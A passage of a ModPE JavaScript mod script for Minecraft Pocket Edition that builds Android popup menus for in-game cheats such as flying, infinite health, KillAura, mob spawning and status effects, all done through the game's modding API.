treeBtn.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(viewarg){
 
arrow = true;
if(primedtnt==true)primedtnt = false;
if(lightning==true)lightning = false;
if(exporb==true)exporb = false;

 enterDialog.dismiss();
clientMessage("Tap ground to spawn entity");
}});

fourBtn.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(viewarg){
 
exporb = true;
if(primedtnt==true)primedtnt = false;
if(lightning==true)lightning = false;
if(arrow==true)arrow = false;

 enterDialog.dismiss();
clientMessage("Tap ground to spawn entity");
}});

fiveBtn.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(viewarg){
 
minecart = true;
if(primedtnt==true)primedtnt = false;
if(lightning==true)lightning = false;
if(arrow==true)arrow = false;
if(exporb==true)exporb = false;

 enterDialog.dismiss();
clientMessage("Tap ground to spawn entity");
}});
 
cBtn.setOnClickListener(new  android.view.View.OnClickListener(){
 
onClick: function(viewarg){
           enterDialog.dismiss();

var lightning = false;
var primedtnt = false;
var arrow = false;
var exporb = false;
var minecart = false;

}});
 
} catch(errr) {
print(errr);
}
}}));
}

var killme = new Button(ctx);
            killme.setText("Kill yourself");        
            killme.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){ 
Player.setHealth(0);
Player.setHealth(0);
                }
            }));
            zmenuLayout.addView(killme);

var clear = new Button(ctx);
            clear.setText("Clear inventory");        
            clear.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){ 
clientMessage(client + "§7Coming soon.");
                }
            }));
            zmenuLayout.addView(clear);

var fp = new android.widget.Button(ctx);
            fp.setText("FPS: "+(showp?"on":"off"));
            fp.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
                showp?showp=false:showp=true;
fp.setText("FPS: "+(showp?"on":"off"));
                }
            }));
            zmenuLayout.addView(fp);

var hea = new android.widget.Button(ctx);
      hea.setText("Heal hearts");
		hea.setOnClickListener(new android.view.View.OnClickListener() {
			onClick: function(v){
             Player.setHealth(20);
             clientMessage(client + "§7Health healed");
			}
		});
		zmenuLayout.addView(hea);

var hun = new android.widget.Button(ctx);
      hun.setText("Heal hunger");
		hun.setOnClickListener(new android.view.View.OnClickListener() {
			onClick: function(v){
             Player.setHunger(25);
             clientMessage(client + "§7Hunger healed");
			}
		});
		zmenuLayout.addView(hun);

var mm = new android.widget.Button(ctx);
      mm.setText("Infinite health: "+(stackheart?"on":"off"));
		mm.setOnClickListener(new android.view.View.OnClickListener() {
			onClick: function(v){         stackheart?stackheart=false:stackheart=true;
mm.setText("Infinite health: "+(stackheart?"on":"off"));
if(stackheart == true){
stackheart = true;
clientMessage(client + "§7infinite health is on");
}
if(stackheart == false){
clientMessage(client + "§7infinite health is off");
Player.setHealth(20);
stackheart = false;
                }
			}
		});
		zmenuLayout.addView(mm);

var mm2 = new android.widget.Button(ctx);
            mm2.setText("Infinite hunger: "+(infhun?"on":"off"));
            mm2.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
infhun?infhun=false:infhun=true;
mm2.setText("Infinite hunger: "+(infhun?"on":"off"));
if(infhun == true){
clientMessage(client + "§7infinite hunger is on");
}
if(infhun == false){
clientMessage(client + "§7infinite hunger is off");
Player.setHunger(20);
                }
}
            }));
            zmenuLayout.addView(mm2);

var zm = new android.widget.Button(ctx);
      zm.setText("1 hit kill: "+(instakilled?"on":"off"));
		zm.setOnClickListener(new android.view.View.OnClickListener() {
			onClick: function(v){         instakilled?instakilled=false:instakilled=true;
zm.setText("1 hit kill: "+(instakilled?"on":"off"));
if(instakilled == true){
instakilled = true;
clientMessage(client + "§7Insta kill is on");
}
if(instakilled == false){
clientMessage(client + "§7Insta kill is off");
instakilled = false;
                }
			}
		});
		zmenuLayout.addView(zm);

var zmm = new android.widget.Button(ctx);
      zmm.setText("Ride mobs: "+(saddle?"on":"off"));
		zmm.setOnClickListener(new android.view.View.OnClickListener() {
			onClick: function(v){
             saddle?saddle=false:saddle=true;
zmm.setText("Ride mobs: "+(saddle?"on":"off"));
if(saddle == true){
clientMessage("§7Ride mobs is on");
clientMessage(client + "§cTap mob to ride,\n§cJump to get off mob.");
saddle = true;
}
if(saddle == false){
clientMessage(client + "§7Ride mobs is off");
saddle = false;
                }
			}
		});
		zmenuLayout.addView(zmm);

var zmmm = new android.widget.Button(ctx);
      zmmm.setText("Instant break: "+(instabreak?"on":"off"));
		zmmm.setOnClickListener(new android.view.View.OnClickListener() {
		 onClick: function(v){
 instabreak?instabreak=false:instabreak=true;
zmmm.setText("Instant break: "+(instabreak?"on":"off"));
if(instabreak == true){
instaDestroy();
clientMessage(client + "§7Instant break is on");
}
if(instabreak == false){
clientMessage(client + "§7Instant break is off");
defaultDestroy();
                }
			}
		});
		zmenuLayout.addView(zmmm);

var f = new android.widget.Button(ctx);
            f.setText("Fly in survival: "+(fch?"on":"off"));
            f.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
fch?fch=false:fch=true;
f.setText("Fly in survival: "+(fch?"on":"off"));
if(fch == true){
Player.setCanFly(1);
clientMessage(client + "§7Fly in survival is on");
}
if(fch == false){
clientMessage(client + "§7Fly in survival is off");
Player.setCanFly(0);
                }
}
            }));
            zmenuLayout.addView(f);

var p = new android.widget.Button(ctx);
            p.setText("Fun particle: "+(parti?"on":"off"));
            p.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
parti?parti=false:parti=true;
p.setText("Fun particle: "+(parti?"on":"off"));
if(parti == true){
clientMessage("§o§cE§bn§aj§eo§dy §1f§2u§3n §4p§5a§6r§7t§8i§9c§0l§fe§l!");
parti2 = true;
parti = true;
}
if(parti == false){
clientMessage(client + "§7Fun particles off");
parti2 = false;
parti = false;
                }
}
            }));
            zmenuLayout.addView(p);

var no = new android.widget.Button(ctx);
      no.setText("Walk through walls: "+(nowalls?"on":"off"));
		no.setOnClickListener(new android.view.View.OnClickListener() {
			onClick: function(v){         nowalls?nowalls=false:nowalls=true;
no.setText("Walk through walls: "+(nowalls?"on":"off"));
if(nowalls == true){
nowalls = true;
clientMessage(client + "§7Walk through walls on");
Entity.setCollisionSize(getPlayerEnt(), 0.1, 0.1);
}
if(nowalls == false){
clientMessage(client + "§7Walk through walls off");
Entity.setCollisionSize(getPlayerEnt(), 1, 2);
nowalls = false;
}
			}
		});
		zmenuLayout.addView(no);

var ww = new android.widget.Button(ctx);
            ww.setText("Walk on water: "+(waterwalk?"on":"off"));
            ww.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
waterwalk?waterwalk=false:waterwalk=true;
ww.setText("Walk on water: "+(waterwalk?"on":"off"));
if(waterwalk == true){
clientMessage(client + "§7You can now walk on water!");
}
if(waterwalk == false){
clientMessage(client + "§7No longer walk on water!");
                }
}
            }));
            zmenuLayout.addView(ww);

var hj = new android.widget.Button(ctx);
            hj.setText("Super jump: "+(highjumps?"on":"off"));
            hj.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
highjumps?highjumps=false:highjumps=true;
hj.setText("Super jump: "+(highjumps?"on":"off"));
if(highjumps == true){
clientMessage(client + "§7Super jump on");
highjumps = true;
}
if(highjumps == false){
clientMessage(client + "§7Super jump off");
highjumps = false;
                }
}
            }));
            zmenuLayout.addView(hj);

var g = new android.widget.Button(ctx);
            g.setText("Grief run: "+(grief?"on":"off"));
            g.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
grief?grief=false:grief=true;
g.setText("Grief run: "+(grief?"on":"off"));
if(grief == true){
clientMessage(client + "§7Your now griefing! hurry run around!");
grief = true;
}
if(grief == false){
clientMessage(client + "§7You stopped griefing!");
grief = false;
                }
}
            }));
            zmenuLayout.addView(g);

var kl = new android.widget.Button(ctx);
            kl.setText("KillAura: "+(killaura?"on":"off"));
            kl.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
killaura?killaura=false:killaura=true;
kl.setText("KillAura: "+(killaura?"on":"off"));
if(killaura == true){
clientMessage(client + "§7KillAura on");
killaura = true;
}
if(killaura == false){
clientMessage(client + "§7KillAura off");
killaura = false;
                }
}
            }));
            zmenuLayout.addView(kl);

var kl2 = new android.widget.Button(ctx);
            kl2.setText("FreezeAura: "+(killfaura?"on":"off"));
            kl2.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
killfaura?killfaura=false:killfaura=true;
kl2.setText("FreezeAura: "+(killfaura?"on":"off"));
if(killfaura == true){
clientMessage(client + "§7FreezeAura on");
killfaura = true;
}
if(killfaura == false){
clientMessage(client + "§7FreezeAura off");
killfaura = false;
                }
}
            }));
            zmenuLayout.addView(kl2);

var ui = new android.widget.Button(ctx);
            ui.setText("Ui Layout Viewer: "+(uirender?"on":"off"));
            ui.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
uirender?uirender=false:uirender=true;
ui.setText("Ui Layout Viewer: "+(uirender?"on":"off"));
if(uirender == true){
ModPE.setUiRenderDebug(true);
}
if(uirender == false){
ModPE.setUiRenderDebug(false);
                }
}
            }));
            zmenuLayout.addView(ui);

var fovy = new Button(ctx);
            fovy.setText("Fov editor");        
            fovy.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){ 

fov(); 

zmenu.dismiss();
                }
            }));
            zmenuLayout.addView(fovy);

var att = new Button(ctx);
            att.setText("Nametag");        
            att.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){ 
nameMe(); 

                }
            }));
            zmenuLayout.addView(att);

function nameMe() {
ctx.runOnUiThread(new java.lang.Runnable(){
run: function(){ 
try{
GetText = new android.widget.PopupWindow();
var Layer8 = new android.widget.LinearLayout(ctx);
var nt = new android.widget.EditText(ctx);
var Dialog = new android.app.Dialog(ctx);
var Exit = new android.widget.Button(ctx);

Dialog.setTitle("Enter nickname");
Dialog.setContentView(Layer8);

Layer8.setOrientation(android.widget.LinearLayout.VERTICAL);
Dialog.show();
Layer8.addView(nt);
Layer8.addView(Exit);

nt.setText("");
nt.setHint("New nickname");
Exit.setText("done");

Exit.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(view){
nametgg =nt.getText();
Dialog.dismiss();
setName();
showMenuBtn();
}
});

GetText.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
} catch (e){
print("The setName Dialog Is Malfunctioning:"+e);
}
}});
}

function setName(){
Entity.setNameTag(Player.getEntity(), nametgg);
}

var fp = new android.widget.Button(ctx);
            fp.setText("Fire punch: "+(firepunch?"on":"off"));
            fp.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
firepunch?firepunch=false:firepunch=true;
fp.setText("Fire punch: "+(firepunch?"on":"off"));
if(firepunch == true){
clientMessage(client + "§7Falcon punch! on");
}
if(firepunch == false){
clientMessage(client + "§7Falcon punch! off");
                }
}
            }));
            zmenuLayout.addView(fp);

		var B_exit = new android.widget.Button(ctx);
		B_exit.setText("Exit");
		B_exit.setOnClickListener(new android.view.View.OnClickListener() {
			onClick: function(v){
             zmenu.dismiss();
showMenuBtn();
			}
		});
		zmenuLayout.addView(B_exit);

            zmenu = new PopupWindow(zmenuLayout1, ctx.getWindowManager().getDefaultDisplay().getWidth()/3, ctx.getWindowManager().getDefaultDisplay().getHeight());
            zmenu.setBackgroundDrawable(new ColorDrawable(GUIColor));
            zmenu.showAtLocation(ctx.getWindow().getDecorView(), GUIPos | Gravity.TOP, 0, 0);
            }catch(error){
                Toast.makeText(ctx, "An error occured: " + error, 1).show();
            }
    }}));
}

function smenu_menu(){
ctx.runOnUiThread(new Runnable({ run: function(){
        try{
            var smenuLayout = new LinearLayout(ctx);
            var smenuScroll = new ScrollView(ctx);
            var smenuLayout1 = new LinearLayout(ctx);
            smenuLayout.setOrientation(1);
            smenuLayout1.setOrientation(1);
            smenuScroll.addView(smenuLayout);
            smenuLayout1.addView(smenuScroll);

var MainTitle = new android.widget.TextView(ctx); MainTitle.setGravity(android.view.Gravity.CENTER);
		MainTitle.setText(name + space + version);
       MainTitle.setTextColor(GUIName);
		MainTitle.setTextSize(20);
		smenuLayout.addView(MainTitle);
            
            var T_title = new android.widget.TextView(ctx); T_title.setGravity(android.view.Gravity.CENTER);
		T_title.setText("Spawn Menu");
       T_title.setTextColor(GUIName);
		T_title.setTextSize(20);
		smenuLayout.addView(T_title);

var A_exit = new android.widget.Button(ctx);
		A_exit.setText("Exit");
		A_exit.setOnClickListener(new android.view.View.OnClickListener() {
			onClick: function(v){
             smenu.dismiss();
showMenuBtn();
			}
		});
		smenuLayout.addView(A_exit);


var spawn10 = new Button(ctx);
            spawn10.setText("Spawn Chicken");      
            spawn10.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
                    Level.spawnMob(Player.getX(), Player.getY(), Player.getZ(), 10);
                }
            }));
            smenuLayout.addView(spawn10);

var spawn11 = new Button(ctx);
            spawn11.setText("Spawn Cow");
            spawn11.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
                    Level.spawnMob(Player.getX(), Player.getY(), Player.getZ(), 11);
                }
            }));
            smenuLayout.addView(spawn11);
            
            var spawn12 = new Button(ctx);
            spawn12.setText("Spawn Pig");
            spawn12.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
                    Level.spawnMob(Player.getX(), Player.getY(), Player.getZ(), 12);
                }
            }));
            smenuLayout.addView(spawn12);
            
            var spawn13 = new Button(ctx);
            spawn13.setText("Spawn Sheep");
            spawn13.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
                    Level.spawnMob(Player.getX(), Player.getY(), Player.getZ(), 13);
                }
            }));
            smenuLayout.addView(spawn13);
            
            var spawn14 = new Button(ctx);
            spawn14.setText("Spawn Wolf");
            spawn14.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
                    Level.spawnMob(Player.getX(), Player.getY(), Player.getZ(), 14);
                }
            }));
            smenuLayout.addView(spawn14);
            
            var spawn15 = new Button(ctx);
            spawn15.setText("Spawn Villager");
            spawn15.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
                    Level.spawnMob(Player.getX(), Player.getY(), Player.getZ(), 15);
                }
            }));
            smenuLayout.addView(spawn15);
            
            var spawn16 = new Button(ctx);
            spawn16.setText("Spawn Mushrom cow");
            spawn16.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
                    Level.spawnMob(Player.getX(), Player.getY(), Player.getZ(), 16);
                }
            }));
            smenuLayout.addView(spawn16);
            
            var spawn17 = new Button(ctx);
            spawn17.setText("Spawn Squid");
            spawn17.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
                    Level.spawnMob(Player.getX(), Player.getY(), Player.getZ(), 17);
                }
            }));
            smenuLayout.addView(spawn17);
            
            var spawn18 = new Button(ctx);
            spawn18.setText("Spawn Rabbit");
            spawn18.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
                    Level.spawnMob(Player.getX(), Player.getY(), Player.getZ(), 18);
                }
            }));
            smenuLayout.addView(spawn18);
            
            var spawn19 = new Button(ctx);
            spawn19.setText("Spawn Bat");
            spawn19.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
                    Level.spawnMob(Player.getX(), Player.getY(), Player.getZ(), 19);
                }
            }));
            smenuLayout.addView(spawn19);
            
            var spawn20 = new Button(ctx);
            spawn20.setText("Spawn Iron golem");
            spawn20.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
                    Level.spawnMob(Player.getX(), Player.getY(), Player.getZ(), 20);
                }
            }));
            smenuLayout.addView(spawn20);
            
            var spawn21 = new Button(ctx);
            spawn21.setText("Spawn Snow golem");
            spawn21.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
                    Level.spawnMob(Player.getX(), Player.getY(), Player.getZ(), 21);
                }
            }));
            smenuLayout.addView(spawn21);
            
            var spawn22 = new Button(ctx);
            spawn22.setText("Spawn Ocelot");
            spawn22.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
                    Level.spawnMob(Player.getX(), Player.getY(), Player.getZ(), 22);
                }
            }));
            smenuLayout.addView(spawn22);

var spawn32 = new Button(ctx);
            spawn32.setText("Spawn Zombie");
            spawn32.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
                    Level.spawnMob(Player.getX(), Player.getY(), Player.getZ(), 32);
                }
            }));
            smenuLayout.addView(spawn32);

var spawn33 = new Button(ctx);
            spawn33.setText("Spawn Creeper");
            spawn33.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
                    Level.spawnMob(Player.getX(), Player.getY(), Player.getZ(), 33);
                }
            }));
            smenuLayout.addView(spawn33);

var spawn34 = new Button(ctx);
            spawn34.setText("Spawn Skeleton");
            spawn34.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
                    Level.spawnMob(Player.getX(), Player.getY(), Player.getZ(), 34);
                }
            }));
            smenuLayout.addView(spawn34);
            
            var spawn35 = new Button(ctx);
            spawn35.setText("Spawn Spider");
            spawn35.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
                    Level.spawnMob(Player.getX(), Player.getY(), Player.getZ(), 35);
                }
            }));
            smenuLayout.addView(spawn35);
            
            var spawn36 = new Button(ctx);
            spawn36.setText("Spawn Zombie pigman");
            spawn36.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
                    Level.spawnMob(Player.getX(), Player.getY(), Player.getZ(), 36);
                }
            }));
            smenuLayout.addView(spawn36);
            
            var spawn37 = new Button(ctx);
            spawn37.setText("Spawn Slime");
            spawn37.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
                    Level.spawnMob(Player.getX(), Player.getY(), Player.getZ(), 37);
                }
            }));
            smenuLayout.addView(spawn37);
            
            var spawn38 = new Button(ctx);
            spawn38.setText("Spawn Enderman");     
            spawn38.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
                    Level.spawnMob(Player.getX(), Player.getY(), Player.getZ(), 38);
                }
            }));
            smenuLayout.addView(spawn38);
            
            var spawn39 = new Button(ctx);
            spawn39.setText("Spawn Silverfish");
            spawn39.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
                    Level.spawnMob(Player.getX(), Player.getY(), Player.getZ(), 39);
                }
            }));
            smenuLayout.addView(spawn39);

var spawn40 = new Button(ctx);
            spawn40.setText("Spawn Cave spider"); 
            spawn40.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
                    Level.spawnMob(Player.getX(), Player.getY(), Player.getZ(), 40);
                }
            }));
            smenuLayout.addView(spawn40);

var spawn41 = new Button(ctx);
            spawn41.setText("Spawn Ghast");      
            spawn41.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
                    Level.spawnMob(Player.getX(), Player.getY(), Player.getZ(), 41);
                }
            }));
            smenuLayout.addView(spawn41);

var spawn42 = new Button(ctx);
            spawn42.setText("Spawn Magma cube");
            spawn42.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
                    Level.spawnMob(Player.getX(), Player.getY(), Player.getZ(), 42);
                }
            }));
            smenuLayout.addView(spawn42);

var spawn43 = new Button(ctx);
            spawn43.setText("Spawn Blaze");       
            spawn43.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
                    Level.spawnMob(Player.getX(), Player.getY(), Player.getZ(), 43);
                }
            }));
            smenuLayout.addView(spawn43);

var spawn44 = new Button(ctx);
            spawn44.setText("Spawn Zombie villager");
            spawn44.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
                    Level.spawnMob(Player.getX(), Player.getY(), Player.getZ(), 44);
                }
            }));
            smenuLayout.addView(spawn44);

var spawn66 = new Button(ctx);
            spawn66.setText("Spawn Witch");            
            spawn66.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
                    Level.spawnMob(Player.getX(), Player.getY(), Player.getZ(), 45);
                }
            }));
            smenuLayout.addView(spawn66);

		var B_exit = new android.widget.Button(ctx);
		B_exit.setText("Exit");
		B_exit.setOnClickListener(new android.view.View.OnClickListener() {
			onClick: function(v){
             smenu.dismiss();
showMenuBtn();
			}
		});
		smenuLayout.addView(B_exit);

            smenu = new PopupWindow(smenuLayout1, ctx.getWindowManager().getDefaultDisplay().getWidth()/3, ctx.getWindowManager().getDefaultDisplay().getHeight());
            smenu.setBackgroundDrawable(new ColorDrawable(GUIColor));
            smenu.showAtLocation(ctx.getWindow().getDecorView(), GUIPos | Gravity.TOP, 0, 0);
            }catch(error){
                Toast.makeText(ctx, "An error occured: " + error, 1).show();
            }
    }}));
}

function emenu_menu(){
ctx.runOnUiThread(new Runnable({ run: function(){
        try{
            var emenuLayout = new LinearLayout(ctx);
            var emenuScroll = new ScrollView(ctx);
            var emenuLayout1 = new LinearLayout(ctx);
            emenuLayout.setOrientation(1);
            emenuLayout1.setOrientation(1);
            emenuScroll.addView(emenuLayout);
            emenuLayout1.addView(emenuScroll);

var MainTitle = new android.widget.TextView(ctx); MainTitle.setGravity(android.view.Gravity.CENTER);
		MainTitle.setText(name + space + version);
       MainTitle.setTextColor(GUIName);
		MainTitle.setTextSize(20);
		emenuLayout.addView(MainTitle);
            
            var y_title = new android.widget.TextView(ctx); y_title.setGravity(android.view.Gravity.CENTER);
		y_title.setText("Effect Menu");
       y_title.setTextColor(GUIName);
		y_title.setTextSize(20);
		emenuLayout.addView(y_title);

var C_exit = new android.widget.Button(ctx);
		C_exit.setText("Exit");
		C_exit.setOnClickListener(new android.view.View.OnClickListener() {
			onClick: function(v){
             emenu.dismiss();
showMenuBtn();
			}
		});
		emenuLayout.addView(C_exit);

            var mov = new Button(ctx);
            mov.setText("Remove all effect");
            mov.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
                 //Entity.removeAllEffects(player);
Entity.removeAllEffects(getPlayerEnt());
                }
            }));
            emenuLayout.addView(mov);

var e1 = new Button(ctx);
            e1.setText("saturation");
            e1.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
ea();
                }
            }));
            emenuLayout.addView(e1);

function ea() {
ctx.runOnUiThread(new java.lang.Runnable(){
run: function(){ 
try{
GetText = new android.widget.PopupWindow();
var Layer = new android.widget.LinearLayout(ctx);
var sec = new android.widget.EditText(ctx);
var lvl = new android.widget.EditText(ctx);
var Dialog = new android.app.Dialog(ctx);
var Exit = new android.widget.Button(ctx);

Dialog.setTitle("Enter Time & Level");
Dialog.setContentView(Layer);

Layer.setOrientation(android.widget.LinearLayout.VERTICAL);
Dialog.show();
Layer.addView(sec);
Layer.addView(lvl);
Layer.addView(Exit);

sec.setText("Seconds");
lvl.setText("Level");
Exit.setText("Done");

Exit.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(view){
s =sec.getText();
l =lvl.getText();
Dialog.dismiss();
inn1();
showMenuBtn();
}
});

GetText.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
} catch (e){
print("The Effect Dialog Is Malfunctioning:"+e);
}
}});
}

function inn1() {
Entity.addEffect(getPlayerEnt(), MobEffect.saturation, s*l, 0, false, true);
}
            
            var e2 = new Button(ctx);
            e2.setText("Absorption");
            e2.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
eb();
                }
            }));
            emenuLayout.addView(e2);

function eb() {
ctx.runOnUiThread(new java.lang.Runnable(){
run: function(){ 
try{
GetText = new android.widget.PopupWindow();
var Layer = new android.widget.LinearLayout(ctx);
var sec = new android.widget.EditText(ctx);
var lvl = new android.widget.EditText(ctx);
var Dialog = new android.app.Dialog(ctx);
var Exit = new android.widget.Button(ctx);

Dialog.setTitle("Enter Time & Level");
Dialog.setContentView(Layer);

Layer.setOrientation(android.widget.LinearLayout.VERTICAL);
Dialog.show();
Layer.addView(sec);
Layer.addView(lvl);
Layer.addView(Exit);

sec.setText("Seconds");
lvl.setText("Level");
Exit.setText("Done");

Exit.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(view){
s =sec.getText();
l =lvl.getText();
Dialog.dismiss();
inn2();
showMenuBtn();
}
});

GetText.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
} catch (e){
print("The Effect Dialog Is Malfunctioning:"+e);
}
}});
}

function inn2() {
Entity.addEffect(getPlayerEnt(), MobEffect.absorption, s*l, 0, false, true);
}

var e3 = new Button(ctx);
            e3.setText("Health boost");
            e3.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
  ec();
                }
            }));
            emenuLayout.addView(e3);

function ec() {
ctx.runOnUiThread(new java.lang.Runnable(){
run: function(){ 
try{
GetText = new android.widget.PopupWindow();
var Layer = new android.widget.LinearLayout(ctx);
var sec = new android.widget.EditText(ctx);
var lvl = new android.widget.EditText(ctx);
var Dialog = new android.app.Dialog(ctx);
var Exit = new android.widget.Button(ctx);

Dialog.setTitle("Enter Time & Level");
Dialog.setContentView(Layer);

Layer.setOrientation(android.widget.LinearLayout.VERTICAL);
Dialog.show();
Layer.addView(sec);
Layer.addView(lvl);
Layer.addView(Exit);

sec.setText("Seconds");
lvl.setText("Level");
Exit.setText("Done");

Exit.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(view){
s =sec.getText();
l =lvl.getText();
Dialog.dismiss();
inn3();
showMenuBtn();
}
});

GetText.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
} catch (e){
print("The Effect Dialog Is Malfunctioning:"+e);
}
}});
}

function inn3() {
Entity.addEffect(getPlayerEnt(), MobEffect.healthBoost, s*l, 0, false, true);
}

var e4 = new Button(ctx);
            e4.setText("Wither");
            e4.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
ed();
                }
            }));
            emenuLayout.addView(e4);

function ed() {
ctx.runOnUiThread(new java.lang.Runnable(){
run: function(){ 
try{
GetText = new android.widget.PopupWindow();
var Layer = new android.widget.LinearLayout(ctx);
var sec = new android.widget.EditText(ctx);
var lvl = new android.widget.EditText(ctx);
var Dialog = new android.app.Dialog(ctx);
var Exit = new android.widget.Button(ctx);

Dialog.setTitle("Enter Time & Level");
Dialog.setContentView(Layer);

Layer.setOrientation(android.widget.LinearLayout.VERTICAL);
Dialog.show();
Layer.addView(sec);
Layer.addView(lvl);
Layer.addView(Exit);

sec.setText("Seconds");
lvl.setText("Level");
Exit.setText("Done");

Exit.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(view){
s =sec.getText();
l =lvl.getText();
Dialog.dismiss();
inn4();
showMenuBtn();
}
});

GetText.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
} catch (e){
print("The Effect Dialog Is Malfunctioning:"+e);
}
}});
}

function inn4() {
Entity.addEffect(getPlayerEnt(), MobEffect.wither, s*l, 0, false, true);
}
            
            var e5 = new Button(ctx);
            e5.setText("Poison");
            e5.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
ee();
                }
            }));
            emenuLayout.addView(e5);

function ee() {
ctx.runOnUiThread(new java.lang.Runnable(){
run: function(){ 
try{
GetText = new android.widget.PopupWindow();
var Layer = new android.widget.LinearLayout(ctx);
var sec = new android.widget.EditText(ctx);
var lvl = new android.widget.EditText(ctx);
var Dialog = new android.app.Dialog(ctx);
var Exit = new android.widget.Button(ctx);

Dialog.setTitle("Enter Time & Level");
Dialog.setContentView(Layer);

Layer.setOrientation(android.widget.LinearLayout.VERTICAL);
Dialog.show();
Layer.addView(sec);
Layer.addView(lvl);
Layer.addView(Exit);

sec.setText("Seconds");
lvl.setText("Level");
Exit.setText("Done");

Exit.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(view){
s =sec.getText();
l =lvl.getText();
Dialog.dismiss();
inn5();
showMenuBtn();
}
});

GetText.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
} catch (e){
print("The Effect Dialog Is Malfunctioning:"+e);
}
}});
}

function inn5() {
Entity.addEffect(getPlayerEnt(), MobEffect.poison, s*l, 0, false, true);
}

var e6 = new Button(ctx);
            e6.setText("Weakness");
            e6.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){
                    ef();
                }
            }));
            emenuLayout.addView(e6);

function ef() {
ctx.runOnUiThread(new java.lang.Runnable(){
run: function(){ 
try{
GetText = new android.widget.PopupWindow();
var Layer = new android.widget.LinearLayout(ctx);
var sec = new android.widget.EditText(ctx);
var lvl = new android.widget.EditText(ctx);
var Dialog = new android.app.Dialog(ctx);
var Exit = new android.widget.Button(ctx);

Dialog.setTitle("Enter Time & Level");
Dialog.setContentView(Layer);

Layer.setOrientation(android.widget.LinearLayout.VERTICAL);
Dialog.show();
Layer.addView(sec);
Layer.addView(lvl);
Layer.addView(Exit);

sec.setText("Seconds");
lvl.setText("Level");
Exit.setText("Done");

Exit.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(view){
s =sec.getText();
l =lvl.getText();
Dialog.dismiss();
inn6();
